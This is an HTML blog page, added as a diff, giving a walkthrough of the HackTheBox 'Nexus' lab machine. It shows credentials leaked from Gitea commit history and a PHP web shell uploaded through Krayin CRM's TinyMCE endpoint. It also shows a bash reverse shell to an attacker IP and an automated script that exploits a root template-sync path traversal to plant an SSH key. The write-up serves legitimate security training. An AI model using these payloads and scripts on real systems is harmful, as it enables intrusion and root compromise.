@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Nexus — NOCTIS</title>
+<meta name="description" content="HackTheBox Nexus machine walkthrough — leaked Gitea commit credentials into an authenticated Krayin CRM file-upload RCE, a leaked .env password reused over SSH, and an automated exploit for a Gitea template-sync path traversal that plants a root SSH key.">
+<meta property="og:title" content="HTB: Nexus — NOCTIS">
+<meta property="og:description" content="HackTheBox Nexus machine walkthrough — leaked Gitea commit credentials into an authenticated Krayin CRM file-upload RCE, a leaked .env password reused over SSH, and an automated exploit for a Gitea template-sync path traversal that plants a root SSH key.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://sp1r4.github.io/writeups/htb-nexus.html">
+<meta property="og:image" content="https://sp1r4.github.io/writeups/assets/og/htb-nexus.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sp1r4.github.io/writeups/assets/og/htb-nexus.png">
+<link rel="canonical" href="https://sp1r4.github.io/writeups/htb-nexus.html">
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    /* terminal colors — muted to stay on-brand */
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── NAV ── */
+
+  /* ── WRAPPER ── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  /* ── POST HEADER ── */
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-git  { background: #d8c8b8; color: #5a3a18; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  /* ── OVERVIEW BOX ── */
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  /* ── ATTACK CHAIN ── */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  /* ── HEADINGS ── */
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  /* ── INLINE CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  /* ── TERMINAL BLOCK ── */
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* prompt colors — muted to match cream palette */
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  /* ── ALERT BOXES ── */
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  /* ── LISTS ── */
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  /* ── SUMMARY TABLE special cols ── */
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  /* ── BACK LINK ── */
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<script id="noctis-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Nexus",
+  "description": "HackTheBox Nexus machine walkthrough — leaked Gitea commit credentials into an authenticated Krayin CRM file-upload RCE, a leaked .env password reused over SSH, and an automated exploit for a Gitea template-sync path traversal that plants a root SSH key.",
+  "datePublished": "2026-08-04",
+  "dateModified": "2026-08-04",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://sp1r4.github.io/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "NOCTIS",
+    "url": "https://sp1r4.github.io/"
+  },
+  "url": "https://sp1r4.github.io/writeups/htb-nexus.html",
+  "image": "https://sp1r4.github.io/writeups/assets/og/htb-nexus.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://sp1r4.github.io/blog.html#htb-nexus"
+  },
+  "timeRequired": "PT8M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://sp1r4.github.io/blog.html">← Back to posts</a>
+
+  <!-- POST HEADER -->
+  <div class="post-header">
+    <h1>HTB: Nexus</h1>
+    <div class="post-meta">
+      <span class="date">August 4, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-git">Gitea</span>
+      <span class="tag">Linux</span>
+      <span>&nbsp;6 min read</span>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <!-- OVERVIEW -->
+  <div class="overview">
+    Nexus revolves around a self-hosted <strong>Gitea</strong> instance backing a Krayin CRM deployment. The foothold is entirely credential-driven: a stale commit in a public Gitea repo leaks the CRM's database password, which unlocks an <strong>authenticated file-upload RCE</strong> in Krayin's email composer. From <code>www-data</code>, a <strong>.env</strong> file hands over a second password that gets reused straight into SSH. Root comes from a <strong>Gitea template-sync path traversal</strong> — a systemd timer that replays pushed git objects onto disk as root without sanitizing <code>../</code>, which I turned into a small automated exploit script.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">Gitea commit history leak</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">Krayin CRM creds</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">TinyMCE upload RCE</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">www-data</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">.env password reuse</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">jones (SSH)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">gitea-template-sync path traversal</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <h3>Nmap</h3>
+  <p>Two ports up front:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nmap -sC -sV -A &lt;TARGET_IP&gt; -oA nexus</span>
+
+<span class="po">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    nginx 1.24.0
+|_http-title: Did not follow redirect to http://nexus.htb</span></div>
+  </div>
+
+  <p>Add the hostname and re-check the vhost:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/hosts</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "&lt;TARGET_IP&gt;  nexus.htb" | sudo tee -a /etc/hosts</span></div>
+  </div>
+
+  <p>The landing page discloses an internal contact address, <code>j.matthew@nexus.htb</code> — a naming pattern worth keeping for later. A vhost/subdomain sweep turns up the real attack surface:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ffuf — vhost enum</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ffuf -w subdomains.txt -H "Host: FUZZ.nexus.htb" -u http://&lt;TARGET_IP&gt; -fs &lt;baseline_size&gt;</span>
+
+<span class="po">git      [Status: 200]
+billing  [Status: 200]</span></div>
+  </div>
+
+  <table>
+    <tr><th>Host</th><th>Service</th><th>Notes</th></tr>
+    <tr><td>git.nexus.htb</td><td>Gitea</td><td>Self-hosted git, public repos browsable</td></tr>
+    <tr><td>billing.nexus.htb</td><td>Krayin CRM 2.2.0</td><td>Login-gated</td></tr>
+  </table>
+
+  <!-- ══ FOOTHOLD SETUP ══ -->
+  <h2>Credential Leak in Gitea Commit History</h2>
+
+  <p>The public repo <code>admin/krayin-docker-setup</code> is exactly what it says — the deployment scaffolding for the CRM. The current tree is clean, but the commit log isn't; an earlier commit still carries the database credentials before they were scrubbed:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">git log -p — krayin-docker-setup</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">git clone http://git.nexus.htb/admin/krayin-docker-setup.git</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">cd krayin-docker-setup &amp;&amp; git log -p --all -- .env docker-compose.yml</span>
+
+<span class="po">- DB_USERNAME=j.matthew@nexus.htb
+- DB_PASSWORD=</span><span class="py">N27xh!!2ucY04</span></div>
+  </div>
+
+  <div class="alert alert-info">Never assume a scrubbed commit stayed scrubbed — <code>git log -p</code> against a repo's full history routinely resurrects "removed" secrets, since deleting a line in a new commit doesn't touch the blob still referenced by the old one.</div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Initial Foothold — Authenticated File Upload RCE (Krayin CRM)</h2>
+
+  <p>Same credentials, different service — they log straight into Krayin CRM on <code>billing.nexus.htb</code>. Krayin's email composer uses TinyMCE, whose image-upload endpoint is where the fun starts: it accepts the file based on the client-supplied extension, not the actual content, so a PHP payload disguised as an image sails through.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">Burp — TinyMCE upload, Compose Email</span>
+    </div>
+    <div class="term-body"><span class="pco"># Mail → Compose → drag in image.png, intercept the POST in Burp</span>
+<span class="po">POST /admin/mail/compose/upload HTTP/1.1
+Host: billing.nexus.htb
+Content-Disposition: form-data; name="file"; filename="</span><span class="py">shell.php</span><span class="po">"
+Content-Type: image/png
+
+</span><span class="py">&lt;?php system($_GET['cmd']); ?&gt;</span></div>
+  </div>
+
+  <p>Krayin stores the upload under a hashed filename and returns the path, no extension re-check on the way in:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">trigger — www-data shell</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">curl "http://billing.nexus.htb/storage/tinymce/&lt;hash&gt;.php?cmd=id"</span>
+<span class="po">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">curl "http://billing.nexus.htb/storage/tinymce/&lt;hash&gt;.php?cmd=</span><span class="py">bash+-c+'bash+-i+%3E%26+/dev/tcp/&lt;YOUR_IP&gt;/4444+0%3E%261'</span><span class="pc">"</span></div>
+  </div>
+
+  <div class="alert alert-success">Reverse shell as <strong>www-data</strong> — content-type validation missing on the TinyMCE media endpoint let a <code>.php</code> file land inside a web-servable storage path.</div>
+
+  <!-- ══ POST-EXPLOIT ══ -->
+  <h2>Post-Exploitation — Krayin .env</h2>
+
+  <p>Standard second pass for a PHP app: the framework's own environment file.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">www-data — .env</span>
+    </div>
+    <div class="term-body"><span class="pg">www-data@nexus:/var/www/html/krayin$ </span><span class="pc">cat .env | grep -i pass</span>
+<span class="po">DB_USERNAME=krayin
+</span><span class="py">DB_PASSWORD=y27xb3ha!!74GbR</span>
+
+<span class="pg">www-data@nexus:/var/www/html/krayin$ </span><span class="pc">cat /etc/passwd | grep 1000</span>
+<span class="po">jones:x:1000:1000::/home/jones:/bin/bash</span></div>
+  </div>
+
+  <!-- ══ LATERAL ══ -->
+  <h2>Lateral Movement — SSH as jones (Password Reuse)</h2>
+
+  <p>The Krayin DB password works verbatim against jones's SSH login:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh — jones</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh jones@nexus.htb</span>
+<span class="po">Password: </span><span class="py">y27xb3ha!!74GbR</span>
+
+<span class="pg">jones@nexus:~$ </span><span class="pc">id</span>
+<span class="pg">uid=1000(jones) gid=1000(jones) groups=1000(jones)</span>
+<span class="pg">jones@nexus:~$ </span><span class="pc">cat user.txt</span>
+<span class="py">HTB{REDACTED}</span></div>
+  </div>
+
+  <div class="alert alert-success">🚩 User flag captured — the CRM's database password was reused verbatim for jones's SSH account.</div>
+
+  <!-- ══ ENUM AS JONES ══ -->
+  <h2>Enumeration as jones — the Template Sync Timer</h2>
+
+  <p>A linpeas pass turns up an active systemd timer with an unusually short interval:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">jones — systemctl</span>
+    </div>
+    <div class="term-body"><span class="pg">jones@nexus:~$ </span><span class="pc">systemctl list-timers</span>
+<span class="po">NEXT                        LEFT   LAST  PASSED  UNIT                      ACTIVATES
+Thu 2026-08-04 12:01:00 UTC 41s    -     -       </span><span class="py">gitea-template-sync.timer</span><span class="po"> gitea-template-sync.service</span>
+
+<span class="pg">jones@nexus:~$ </span><span class="pc">systemctl cat gitea-template-sync.service</span>
+<span class="po">[Service]
+User=root
+ExecStart=</span><span class="py">/usr/bin/python3 /etc/gitea/template-sync.py</span></div>
+  </div>
+
+  <p>The script runs as root, every 60 seconds. Reading it shows why that's a problem — it walks a pushed template repo with <code>git ls-tree</code>/<code>git cat-file</code> and writes every entry straight to a target path built from the tree entry's name, with no check for <code>../</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/etc/gitea/template-sync.py — the bug</span>
+    </div>
+    <div class="term-body"><span class="pg">jones@nexus:~$ </span><span class="pc">cat /etc/gitea/template-sync.py</span>
+<span class="po">for entry in run(["git", "ls-tree", "-r", ref]).splitlines():
+    mode, _, blob, path = entry.split(None, 3)
+    </span><span class="pco"># path comes straight from the git tree, unsanitized</span>
+<span class="po">    dest = os.path.join(STAGING_ROOT, path)
+    data = run(["git", "cat-file", "-p", blob])
+    write(dest, data)   </span><span class="pco"># no realpath/containment check against STAGING_ROOT</span></div>
+  </div>
+
+  <div class="alert alert-warn">
+    <code>os.path.join</code> with an attacker-controlled second argument doesn't sanitize <code>../</code> — a git tree entry literally named <code>../../../../../root/.ssh/authorized_keys</code> writes exactly there once the sync service (root) runs the checkout. Any repo marked as a <strong>template</strong> in Gitea gets synced.
+  </div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Privilege Escalation to Root — Gitea Template Sync Path Traversal</h2>
+
+  <p>I wrapped the whole chain into a single script rather than replaying it by hand each time: mint an API token, stand up a template repo, commit a git tree that traverses out of the staging root into <code>/root/.ssh</code>, push it, wait one sync cycle, then SSH in on the planted key.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">exploit.sh</span>
+    </div>
+    <div class="term-body"><span class="pco">#!/bin/bash
+# Nexus Privilege Escalation - Automated Exploit
+# Exploits: Gitea template sync path traversal (runs as root)</span>
+
+GITEA=<span class="py">"http://localhost:3000"</span>
+USER=<span class="py">"jones"</span>
+PASS=<span class="py">'y27xb3ha!!74GbR'</span>
+TARGET=<span class="py">"&lt;TARGET_IP&gt;"</span>
+
+<span class="pco"># STEP 1: local SSH keypair to plant as root's authorized_keys</span>
+ssh-keygen -t ed25519 -f /tmp/.exploit_key -N <span class="py">''</span> -q
+PUBKEY=$(cat /tmp/.exploit_key.pub)
+
+<span class="pco"># STEP 2: mint a Gitea API token as jones</span>
+TOKEN=$(curl -s -X POST $GITEA/api/v1/users/$USER/tokens \
+  -H <span class="py">"Content-Type: application/json"</span> \
+  -u <span class="py">"$USER:$PASS"</span> \
+  -d <span class="py">'{"name":"auto_token","scopes":["write:repository"]}'</span> \
+  | grep -o <span class="py">'"sha1":"[^"]*"'</span> | cut -d<span class="py">'"'</span> -f4)
+
+<span class="pco"># STEP 3: create a repo and mark it as a Gitea template
+#         (only template repos get pulled by the sync service)</span>
+curl -s -X POST $GITEA/api/v1/user/repos \
+  -H <span class="py">"Authorization: token $TOKEN"</span> \
+  -d <span class="py">'{"name":"rce","private":false}'</span> &gt; /dev/null
+curl -s -X PATCH $GITEA/api/v1/repos/$USER/rce \
+  -H <span class="py">"Authorization: token $TOKEN"</span> \
+  -d <span class="py">'{"template":true}'</span> &gt; /dev/null
+
+<span class="pco"># STEP 4: build a git tree that traverses out of the sync staging dir</span>
+mkdir -p /tmp/rce_exploit &amp;&amp; cd /tmp/rce_exploit
+git init
+mkdir -p <span class="py">"../../../../../root/.ssh"</span>
+echo <span class="py">"$PUBKEY"</span> &gt; <span class="py">"../../../../../root/.ssh/authorized_keys"</span>
+git add . &amp;&amp; git commit -m <span class="py">"Template injection"</span>
+
+<span class="pco"># STEP 5: push — the next sync cycle replays this tree as root</span>
+git remote add origin http://localhost:3000/$USER/rce.git
+git push -u origin main
+
+<span class="pco"># STEP 6: wait one sync interval (60s)</span>
+sleep 65
+
+<span class="pco"># STEP 7/8: key should now be live in /root/.ssh — connect</span>
+ssh -i /tmp/.exploit_key -o StrictHostKeyChecking=no root@$TARGET</span></div>
+  </div>
+
+  <p>Run against the box:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">exploit run</span>
+    </div>
+    <div class="term-body"><span class="pg">jones@nexus:~$ </span><span class="pc">./exploit.sh</span>
+<span class="po">[*] STEP 1: Generating SSH key pair...
+[+] SSH key generated at /tmp/.exploit_key
+[*] STEP 2: Obtaining Gitea API token...
+[+] Token acquired: &lt;token&gt;
+[*] STEP 3: Creating template repository...
+[+] Repository created and marked as template
+[*] STEP 4: Building malicious git objects...
+[+] Malicious git objects ready
+[*] STEP 5: Pushing to Gitea repository...
+[+] Pushed to repository
+[*] STEP 6: Waiting for template sync (runs every 60 seconds)...
+[+] Sync period should have completed
+[*] STEP 7: Verifying SSH key installation...
+[+] SUCCESS! SSH key installed in /root/.ssh/authorized_keys
+[*] STEP 8: Spawning root shell...</span>
+
+<span class="pr">root@nexus:~# </span><span class="pc">id</span>
+<span class="pr">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="pr">root@nexus:~# </span><span class="pc">cat /root/root.txt</span>
+<span class="py">HTB{REDACTED}</span></div>
+  </div>
+
+  <div class="alert alert-success">🚩 Root flag captured. The template-sync service trusted every path inside a pushed git tree and replayed it onto disk as root — marking a repo <code>template: true</code> was the only gate, and jones already had write access to create one.</div>
+
+  <!-- ══ SUMMARY ══ -->
+  <h2>Summary</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Technique</th><th>Tool</th></tr>
+    <tr><td>Recon</td><td>Vhost discovery — Gitea + Krayin CRM behind the main site</td><td>ffuf</td></tr>
+    <tr><td>Credential leak</td><td>DB password left in an old, unreverted Gitea commit</td><td>git log -p</td></tr>
+    <tr><td>Foothold</td><td>Authenticated TinyMCE upload RCE — extension-only validation</td><td>Burp Suite, curl</td></tr>
+    <tr><td>Credential theft</td><td>Plaintext DB password in Krayin's <code>.env</code></td><td>—</td></tr>
+    <tr><td>Lateral move</td><td>Password reuse (Krayin DB → jones SSH)</td><td>ssh</td></tr>
+    <tr><td>Root</td><td>Gitea template-sync <code>git ls-tree</code> path traversal, root timer</td><td>Custom bash exploit</td></tr>
+  </table>
+
+  <!-- ══ COMMAND REF ══ -->
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># Enumeration</span>
+<span class="pc">ffuf -w subdomains.txt -H "Host: FUZZ.nexus.htb" -u http://&lt;IP&gt; -fs &lt;size&gt;</span>
+<span class="pc">git log -p --all -- .env docker-compose.yml</span>
+
+<span class="pco"># TinyMCE upload RCE (Krayin CRM)</span>
+<span class="pc">curl "http://billing.nexus.htb/storage/tinymce/&lt;hash&gt;.php?cmd=id"</span>
+
+<span class="pco"># Post-exploit</span>
+<span class="pc">cat /var/www/html/krayin/.env | grep -i pass</span>
+
+<span class="pco"># Gitea template-sync path traversal → root</span>
+<span class="pc">systemctl list-timers | grep gitea</span>
+<span class="pc">curl -s -X POST $GITEA/api/v1/users/$USER/tokens -u "$USER:$PASS" \</span>
+<span class="pc">  -d '{"name":"t","scopes":["write:repository"]}'</span>
+<span class="pc">curl -s -X PATCH $GITEA/api/v1/repos/$USER/rce -H "Authorization: token $TOKEN" \</span>
+<span class="pc">  -d '{"template":true}'</span>
+<span class="pc">mkdir -p "../../../../../root/.ssh" &amp;&amp; git add . &amp;&amp; git commit -m x &amp;&amp; git push</span></div>
+  </div>
+
+</div>
+
+<footer>
+  <span>© 2026 <a href="https://sp1r4.github.io/index.html">NOCTIS</a> — SP1R4</span>
